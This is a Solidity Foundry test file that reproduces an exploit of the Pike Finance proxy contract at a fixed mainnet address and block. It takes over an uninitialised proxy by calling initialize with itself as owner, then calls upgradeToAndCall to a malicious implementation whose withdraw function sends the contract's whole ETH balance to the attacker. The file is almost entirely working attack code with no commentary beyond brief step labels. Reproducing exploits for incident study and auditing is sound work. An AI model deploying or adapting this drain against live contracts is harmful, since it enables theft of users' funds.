// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IPikeFinanceProxy {
    function initialize(
        address,
        address,
        address,
        address,
        uint16,
        uint16
    ) external;

    function upgradeToAndCall(address, bytes memory) external;
}

contract PikeFinanceHack {
    function proxiableUUID() external pure returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function withdraw(address addr) external {
        (bool success, ) = payable(addr).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}

contract PikeFinanceTest is Test {
    address constant PikeFinanceProxy =
        0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.createSelectFork("mainnet", 19771059 - 1);
        deal(address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("ETH Balance", address(this).balance, 18);

        // Initialize proxy contract
        address _owner = address(this);
        address _WNativeAddress = address(this);
        address _uniswapHelperAddress = address(this);
        address _tokenAddress = address(this);
        uint16 _swapFee = 20;
        uint16 _withdrawFee = 20;
        IPikeFinanceProxy(PikeFinanceProxy).initialize(
            _owner,
            _WNativeAddress,
            _uniswapHelperAddress,
            _tokenAddress,
            _swapFee,
            _withdrawFee
        );

        // Upgrade proxy contract
        bytes memory data = abi.encodeWithSignature(
            "withdraw(address)",
            address(this)
        );
        PikeFinanceHack hack = new PikeFinanceHack();
        IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(
            address(hack),
            data
        );

        print("ETH Balance", address(this).balance, 18);
    }

    receive() external payable {}
}
